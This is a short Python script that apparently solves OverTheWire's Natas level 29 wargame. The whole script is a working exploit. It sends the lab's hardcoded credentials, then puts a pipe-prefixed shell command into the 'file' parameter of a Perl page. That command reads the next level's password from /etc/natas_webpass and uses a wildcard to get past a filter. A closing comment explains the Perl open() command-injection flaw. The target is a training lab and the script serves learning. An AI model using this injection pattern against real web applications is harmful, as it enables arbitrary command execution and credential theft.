import requests
import re

username = "natas29"
password = "hwgoYUiGWoSZAqphtCAZf7u1jS16KEah"
url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.session()
# response = session.post(url, auth=(username,password), data={"file":"perl underground"})
response = session.get(url + "index.pl?file=|cat /etc/na*as_webpass/na*as30|tr -d '\n'", auth=(username,password))

print(response.text)
#print (re.findall("Password: (.*)</pre>",response.text)[0])

# Vulnerability: User input in the "file" parameter is passed to Perl's open(), 
# where a leading "|" is interpreted as a command, allowing arbitrary command execution (command injection).
